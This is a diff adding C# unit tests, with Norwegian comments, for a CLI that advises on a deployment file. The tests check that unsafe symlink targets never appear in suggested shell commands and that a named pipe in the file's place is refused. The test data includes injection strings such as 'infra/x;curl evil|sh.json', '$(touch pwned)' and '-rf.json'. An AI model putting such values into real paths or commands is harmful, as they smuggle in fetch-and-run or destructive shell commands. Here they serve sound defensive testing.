@@ -1,3 +1,5 @@
+using System.Diagnostics;
+using System.Text;
 using System.Text.Json.Nodes;
 using Queuey.Client.Cli.Advise;
 using Queuey.Client.Waas;
@@ -9,11 +11,14 @@ namespace Queuey.Client.Cli.Tests;
 /// (en lenke, for stor, budsjett eller frist), ble regnet som borte, og agenten fikk beskjed om å skrive en ny fil over den.
 /// Nå sjekkes den for seg og leses før og utenfor budsjettet. En form advise ikke leser, gir en konflikt med veien ut, aldri
 /// et forslag om en ny fil. Og flettingen leser egenskapsnavn i alle skrivemåter, som leseren av fila gjør (K-3).
+/// Etter reviewen av #57: et lenkemål vises bare når det er en vanlig sti (K-b), og det som åpnes, kan ikke være et rør som
+/// holder skanningen (K-a).
 /// </summary>
 public sealed class RootDeployFileTests : IDisposable
 {
     private readonly string _root = Path.Combine(Path.GetTempPath(), "queuey-rootfile-" + Guid.NewGuid().ToString("N")[..8]);
     private readonly List<string> _outside = new();
+    private readonly List<string> _pipes = new();
 
     private const string StripeIntent = """
         {
@@ -28,6 +33,8 @@ public sealed class RootDeployFileTests : IDisposable
 
     public void Dispose()
     {
+        foreach (string pipe in _pipes)
+            Release(pipe);
         foreach (string dir in _outside.Append(_root))
         {
             try { Directory.Delete(dir, recursive: true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
@@ -50,7 +57,31 @@ public sealed class RootDeployFileTests : IDisposable
         Assert.Equal(("unsupported", "queuey.deploy.json"), (conflict.Kind, conflict.Field));
         Assert.Contains("is a symbolic link to infra/queuey.deploy.json", conflict.Message, StringComparison.Ordinal);
         Assert.Contains("write the content it proposes to infra/queuey.deploy.json", conflict.Question, StringComparison.Ordinal);
+        // git checkout gir bare lenken tilbake når git har den (K-b).
+        Assert.Contains("git checkout -- queuey.deploy.json when git tracks it, or ln -sf infra/queuey.deploy.json queuey.deploy.json " +
+                        "when it does not", conflict.Question, StringComparison.Ordinal);
         Assert.Null(advice.Design);   // aldri en ny fil over lenken
+    }
+
+    [Theory]
+    [InlineData("infra/x;curl evil|sh.json", "curl")]
+    [InlineData("infra/$(touch pwned).json", "pwned")]
+    [InlineData("-rf.json", "-rf")]
+    public void A_link_whose_target_is_not_a_plain_path_does_not_show_where_it_points(string target, string part)
+    {
+        // Veien ut er kommandoer en agent kan lime inn i et skall: et mål med ; | $( eller - først vises aldri (K-b).
+        Fixture("stripe-aspnet");
+        if (!TryLink("queuey.deploy.json", target))
+            return;
+
+        FlowAdvice advice = Advise();
+
+        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
+        Assert.Contains("is a symbolic link out of the repository", conflict.Message, StringComparison.Ordinal);
+        string shown = conflict.Message + "\n" + conflict.Question;
+        foreach (string unsafePart in new[] { part, ";", "|", "$(" })
+            Assert.DoesNotContain(unsafePart, shown, StringComparison.Ordinal);
+        Assert.Null(advice.Design);
     }
 
     [Fact]
@@ -126,6 +157,62 @@ public sealed class RootDeployFileTests : IDisposable
         {
             File.SetUnixFileMode(Path.Combine(_root, "queuey.deploy.json"), UnixFileMode.UserRead | UnixFileMode.UserWrite);
         }
+    }
+
+    // ── det som åpnes, er ikke det som ble sjekket (K-a) ────────────────
+    //
+    // Et bytte mellom sjekken og åpningen, eller mellom lesingen og den nye sjekken av lenken, lar seg ikke treffe på
+    // et bestemt tidspunkt i en test. Rørene under står der fra start og prøver det åpningen gjør når byttet har skjedd.
+
+    [Fact]
+    public async Task A_pipe_where_the_deployment_file_should_be_is_a_conflict_once_the_open_times_out()
+    {
+        Fixture("stripe-aspnet");
+        if (!TryPipe("queuey.deploy.json"))
+            return;
+
+        // Testens egen frist: henger åpningen, feiler testen i stedet for å vente for alltid.
+        FlowFacts facts = await Task.Run(() => FlowScan.Scan(_root, ScanBudget.Default, TimeSpan.FromMilliseconds(300)))
+            .WaitAsync(TimeSpan.FromSeconds(60));
+        FlowAdvice advice = FlowAdvisor.Advise(DesiredFlow.Parse(StripeIntent), facts, _root);
+
+        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
+        Assert.Equal(("unsupported", "queuey.deploy.json"), (conflict.Kind, conflict.Field));
+        Assert.Contains("did not open within 300 ms, as a pipe without a writer never does", conflict.Message, StringComparison.Ordinal);
+        Assert.Null(advice.Design);
+    }
+
+    [Fact]
+    public async Task A_pipe_with_a_writer_is_refused_before_anything_is_read_from_it()
+    {
+        Fixture("stripe-aspnet");
+        if (!TryPipe("queuey.deploy.json"))
+            return;
+        string pipe = Path.Combine(_root, "queuey.deploy.json");
+
+        // Skriveren kommer fram når leseren åpner, og skriver en fil som ville gitt to køer om den ble lest.
+        Task writer = Task.Factory.StartNew(() =>
+        {
+            try
+            {
+                using var stream = new FileStream(pipe, FileMode.Open, FileAccess.Write, FileShare.ReadWrite);
+                stream.Write(Encoding.UTF8.GetBytes(TwoQueues));
+            }
+            catch (IOException)
+            {
+                // leseren lukket røret uten å lese
+            }
+        }, TaskCreationOptions.LongRunning);
+
+        FlowFacts facts = await Task.Run(() => FlowScan.Scan(_root, ScanBudget.Default, TimeSpan.FromSeconds(30)))
+            .WaitAsync(TimeSpan.FromSeconds(60));
+        FlowAdvice advice = FlowAdvisor.Advise(DesiredFlow.Parse(StripeIntent), facts, _root);
+
+        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
+        Assert.Contains("is not a regular file (a pipe or a socket, for instance)", conflict.Message, StringComparison.Ordinal);
+        Assert.Empty(facts.DeployFile!.Queues);
+        Assert.Null(advice.Design);
+        await writer.WaitAsync(TimeSpan.FromSeconds(30));
     }
 
     // ── budsjettet og fristen rører den ikke ─────────────────────────────
@@ -266,6 +353,51 @@ public sealed class RootDeployFileTests : IDisposable
         {
             return false;   // Windows uten utviklermodus lager ikke lenker
         }
+    }
+
+    /// <summary>Et navngitt rør (mkfifo) der en fil skulle stå; false der det ikke lar seg lage (Windows).</summary>
+    private bool TryPipe(string relativePath)
+    {
+        if (OperatingSystem.IsWindows())
+            return false;
+
+        string path = Path.Combine(_root, relativePath);
+        var start = new ProcessStartInfo("mkfifo") { UseShellExecute = false };
+        start.ArgumentList.Add(path);
+        try
+        {
+            using Process mkfifo = Process.Start(start)!;
+            if (!mkfifo.WaitForExit(10_000) || mkfifo.ExitCode != 0)
+                return false;
+        }
+        catch (System.ComponentModel.Win32Exception)
+        {
+            return false;   // ingen mkfifo på stien
+        }
+
+        _pipes.Add(path);
+        return true;
+    }
+
+    /// <summary>
+    /// Slipper en åpning som fortsatt venter på en skriver i røret. Å åpne det for lesing og skriving venter aldri selv
+    /// (Linux og macOS), men tråden får likevel en frist.
+    /// </summary>
+    private static void Release(string pipe)
+    {
+        var release = new Thread(() =>
+        {
+            try
+            {
+                new FileStream(pipe, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite).Dispose();
+            }
+            catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
+            {
+                // borte eller ikke lenger et rør
+            }
+        }) { IsBackground = true };
+        release.Start();
+        release.Join(TimeSpan.FromSeconds(2));
     }
 
     private void Fixture(string name)
